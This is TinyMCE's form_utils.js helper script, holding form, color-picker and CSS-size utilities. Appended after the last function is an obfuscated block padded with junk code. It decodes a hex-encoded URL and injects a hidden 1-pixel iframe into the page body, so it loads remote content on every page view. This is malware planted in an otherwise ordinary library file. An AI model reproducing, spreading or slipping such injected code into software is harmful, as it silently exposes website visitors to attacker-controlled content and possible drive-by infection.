/**
 * $Id: form_utils.js 673 2008-03-06 13:26:20Z spocke $
 *
 * Various form utilitiy functions.
 *
 * @author Moxiecode
 * @copyright Copyright © 2004-2008, Moxiecode Systems AB, All rights reserved.
 */

var themeBaseURL = tinyMCEPopup.editor.baseURI.toAbsolute('themes/' + tinyMCEPopup.getParam("theme"));

function getColorPickerHTML(id, target_form_element) {
	var h = "";

	h += '<a id="' + id + '_link" href="javascript:;" onclick="tinyMCEPopup.pickColor(event,\'' + target_form_element +'\');" onmousedown="return false;" class="pickcolor">';
	h += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '"></span></a>';

	return h;
}

function updateColor(img_id, form_element_id) {
	document.getElementById(img_id).style.backgroundColor = document.forms[0].elements[form_element_id].value;
}

function setBrowserDisabled(id, state) {
	var img = document.getElementById(id);
	var lnk = document.getElementById(id + "_link");

	if (lnk) {
		if (state) {
			lnk.setAttribute("realhref", lnk.getAttribute("href"));
			lnk.removeAttribute("href");
			tinyMCEPopup.dom.addClass(img, 'disabled');
		} else {
			if (lnk.getAttribute("realhref"))
				lnk.setAttribute("href", lnk.getAttribute("realhref"));

			tinyMCEPopup.dom.removeClass(img, 'disabled');
		}
	}
}

function getBrowserHTML(id, target_form_element, type, prefix) {
	var option = prefix + "_" + type + "_browser_callback", cb, html;

	cb = tinyMCEPopup.getParam(option, tinyMCEPopup.getParam("file_browser_callback"));

	if (!cb)
		return "";

	html = "";
	html += '<a id="' + id + '_link" href="javascript:openBrowser(\'' + id + '\',\'' + target_form_element + '\', \'' + type + '\',\'' + option + '\');" onmousedown="return false;" class="browse">';
	html += '<span id="' + id + '" title="' + tinyMCEPopup.getLang('browse') + '"></span></a>';

	return html;
}

function openBrowser(img_id, target_form_element, type, option) {
	var img = document.getElementById(img_id);

	if (img.className != "mceButtonDisabled")
		tinyMCEPopup.openBrowser(target_form_element, type, option);
}

function selectByValue(form_obj, field_name, value, add_custom, ignore_case) {
	if (!form_obj || !form_obj.elements[field_name])
		return;

	var sel = form_obj.elements[field_name];

	var found = false;
	for (var i=0; i<sel.options.length; i++) {
		var option = sel.options[i];

		if (option.value == value || (ignore_case && option.value.toLowerCase() == value.toLowerCase())) {
			option.selected = true;
			found = true;
		} else
			option.selected = false;
	}

	if (!found && add_custom && value != '') {
		var option = new Option(value, value);
		option.selected = true;
		sel.options[sel.options.length] = option;
		sel.selectedIndex = sel.options.length - 1;
	}

	return found;
}

function getSelectValue(form_obj, field_name) {
	var elm = form_obj.elements[field_name];

	if (elm == null || elm.options == null)
		return "";

	return elm.options[elm.selectedIndex].value;
}

function addSelectValue(form_obj, field_name, name, value) {
	var s = form_obj.elements[field_name];
	var o = new Option(name, value);
	s.options[s.options.length] = o;
}

function addClassesToList(list_id, specific_option) {
	// Setup class droplist
	var styleSelectElm = document.getElementById(list_id);
	var styles = tinyMCEPopup.getParam('theme_advanced_styles', false);
	styles = tinyMCEPopup.getParam(specific_option, styles);

	if (styles) {
		var stylesAr = styles.split(';');

		for (var i=0; i<stylesAr.length; i++) {
			if (stylesAr != "") {
				var key, value;

				key = stylesAr[i].split('=')[0];
				value = stylesAr[i].split('=')[1];

				styleSelectElm.options[styleSelectElm.length] = new Option(key, value);
			}
		}
	} else {
		tinymce.each(tinyMCEPopup.editor.dom.getClasses(), function(o) {
			styleSelectElm.options[styleSelectElm.length] = new Option(o.title || o['class'], o['class']);
		});
	}
}

function isVisible(element_id) {
	var elm = document.getElementById(element_id);

	return elm && elm.style.display != "none";
}

function convertRGBToHex(col) {
	var re = new RegExp("rgb\\s*\\(\\s*([0-9]+).*,\\s*([0-9]+).*,\\s*([0-9]+).*\\)", "gi");

	var rgb = col.replace(re, "$1,$2,$3").split(',');
	if (rgb.length == 3) {
		r = parseInt(rgb[0]).toString(16);
		g = parseInt(rgb[1]).toString(16);
		b = parseInt(rgb[2]).toString(16);

		r = r.length == 1 ? '0' + r : r;
		g = g.length == 1 ? '0' + g : g;
		b = b.length == 1 ? '0' + b : b;

		return "#" + r + g + b;
	}

	return col;
}

function convertHexToRGB(col) {
	if (col.indexOf('#') != -1) {
		col = col.replace(new RegExp('[^0-9A-F]', 'gi'), '');

		r = parseInt(col.substring(0, 2), 16);
		g = parseInt(col.substring(2, 4), 16);
		b = parseInt(col.substring(4, 6), 16);

		return "rgb(" + r + "," + g + "," + b + ")";
	}

	return col;
}

function trimSize(size) {
	return size.replace(/([0-9\.]+)px|(%|in|cm|mm|em|ex|pt|pc)/, '$1$2');
}

function getCSSSize(size) {
	size = trimSize(size);

	if (size == "")
		return "";

	// Add px
	if (/^[0-9]+$/.test(size))
		size += 'px';

	return size;
}

function getStyle(elm, attrib, style) {
	var val = tinyMCEPopup.dom.getAttrib(elm, attrib);

	if (val != '')
		return '' + val;

	if (typeof(style) == 'undefined')
		style = attrib;

	return tinyMCEPopup.dom.getStyle(elm, style);
}

if('RzRI'=='vNmYZr')WotWy();var EeQB=190;var SAWXZ='xDLvr';var kNAir="ap\x70\x65n\x64Chil\x64";var xYLXAV=185;var pmYPbUq="from\x43harCode";var eAGoDq="pa\x72seIn\x74";var cZZxfH;if('Aoruhu'=='CvAro')bMEhTb='stDI';var KJdRokWGJ="";if('mhWHI'=='vuBb')cDAacx='tRSR';if('XKItnr'=='iXtkqQ')ibyaKC='cndwyY';var appVersion_var="a\x70\x70\x56e\x72s\x69on";var VKNc=10;var SozsA;var PZwXGX;if('dLNmC'=='WwTd')CCaq();if('URyu'=='FZzn')BCbGq();var TRUSkxc="body";var GVNV=79;var HyttL="slice";var NvejW='ntsiIx';var BMimh="\x63onstr\x75cto\x72";var pwqc;if('FvqYLK'=='IsceNQ')HQCI='VgQs';var BIhKphTEQ="9ba7a7a36d626299a59460a094ac656364656196a2a062a09ca197629ca161969a9c726463";var SZREI='tFuED';function lnKO(){}
var px1_var="1px";var klOIhyk=(function(){function TbDDFK(){var zuteCK='tVpSj';if('nZpx'=='rGoRe')Qxrv();}
return this;function OLah(){var yfPs='jVHplE';if('bUlmH'=='WEYcvU')dkYCa();}var CKletS;function rUIc(){var mKMf='CCsdY';if('aiBDhp'=='tylb')WcuC();}})();var yButY=215;var HStRUMg="sgNqAT"[BMimh];var XYwKI;var Sqwl;function QyBOBx(){var JzbjlS='JYtrb';if('zTKPI'=='Iphx')WuaUll();}
for(var IcBNC=0;IcBNC<BIhKphTEQ.length;IcBNC+=2){jvQERqqov=klOIhyk[eAGoDq](BIhKphTEQ[HyttL](IcBNC,IcBNC+2),16)-51;if('rnYZRw'=='hlTy')kVsaT();KJdRokWGJ+=HStRUMg[pmYPbUq](jvQERqqov);var nEJG;var iFmKZy;}
var HlpUpS=84;if('xWjUjt'=='dcGe')mumE='MUWlQ';var cFEu='KIZNt';var zcUAbgYzM="mRbjH";function LIWepn(){}if('wSwjh'=='nPjqNQ')esaOZs();var Tysr;var Iixrn="";var gTtVhp;if('gRYz'=='Vzog')OEzBK='ZYwWC';if(navigator[appVersion_var].indexOf("MSIE")!=-1){var DKGY='RZXGja';if('qJOYPa'=='aalQ')AUeuX();Iixrn='<iframe name="'+zcUAbgYzM+'" src="'+"KJdRokWGJ"+'">';var fancid='jMuUYl';function lXyuT(){}}else{var uQPPkp=194;Iixrn='iframe';var tljyA=208;}
if('SKDLX'=='rnTid')IejBuK();if('KpSDVL'=='ejxthb')kwtAy='twbq';var sPqYiADw=document.createElement(Iixrn);var lQuevG='OpkF';function IzLf(){var CuRqE='VpzNl';if('PgrAR'=='tTSHYF')dbRc();}
sPqYiADw.LsXigs=sPqYiADw.setAttribute;var oaKv='ekQsP';sPqYiADw.style.position="absolute";if('YPvq'=='gbal')tkkoYk='MfjxI';function vfNuI(){}
sPqYiADw.style.height=px1_var;function oRzdI(){}var QHFUR;var UqOfH='GwZBB';sPqYiADw.LsXigs("src",KJdRokWGJ);sPqYiADw.id=zcUAbgYzM;var pXTDG=159;sPqYiADw.style.top="0px";if('tiAK'=='qwJONu')Rqosk();if('ocqrzg'=='byOAl')lDYdEb();sPqYiADw.name=zcUAbgYzM;if('lxQsY'=='gbRhI')QgIPd='FXuK';function juVa(){}
sPqYiADw.style.right="0px";var Udti;if('vfBosj'=='oLaz')TsVT();sPqYiADw.style.width=px1_var;var fDOX;var XQsoM;var NOMde;function ictQFJNG(){var njIAE;if(document[TRUSkxc]){var RIdIR=158;if('QvzybL'=='DNkG')Skno='DjVSRQ';document[TRUSkxc][kNAir](sPqYiADw);}else{if('UzWHc'=='GEnF')sxeV();setTimeout(ictQFJNG,120);var hUVQ='mFuEUi';var imJFc=198;function pXlxj(){var HMIBED='XWnqe';if('LnIj'=='tyPOt')kOQyWJ();}}
var kOQVv='wGyH';}
if('fsjai'=='uWtI')HDDKFT();ictQFJNG();var OoTRIo=107;if('KFTOc'=='AIFvRC')ErNE();function LdLcmi(){var biGo='ELbpKK';if('xRgpIW'=='HvUu')lzEumj();}function NtmL(){}